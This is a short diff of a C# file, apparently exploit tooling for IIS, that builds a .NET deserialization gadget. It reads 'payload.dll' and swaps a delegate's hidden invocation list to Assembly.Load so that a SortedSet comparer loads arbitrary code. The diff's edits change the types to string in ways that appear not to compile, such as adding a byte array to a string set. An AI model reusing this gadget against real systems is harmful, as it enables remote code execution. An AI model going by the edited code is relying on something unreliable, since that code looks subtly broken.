@@ -14,12 +14,12 @@ namespace hawktraceiis
         {
             
             byte[] ASSEMBLY_BYTES = File.ReadAllBytes(@"payload.dll");
-            Delegate da = new Comparison<Array>(Array.IndexOf);
-            Comparison<Array> d = (Comparison<Array>)MulticastDelegate.Combine(da, da);
-            IComparer<Array> comp = Comparer<Array>.Create(d);
-            SortedSet<Array> set = new SortedSet<Array>(comp);
+            Delegate da = new Comparison<string>(String.IndexOf);
+            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
+            IComparer<string> comp = Comparer<string>.Create(d);
+            SortedSet<string> set = new SortedSet<string>(comp);
             set.Add(ASSEMBLY_BYTES);
-            set.Add("dummy".ToCharArray());
+            set.Add("cea".ToCharArray());
             FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
             object[] invoke_list = d.GetInvocationList();
             invoke_list[1] = new Func<byte[], Assembly>(Assembly.Load);
@@ -42,3 +42,4 @@ namespace hawktraceiis
         }
     }
 }
+
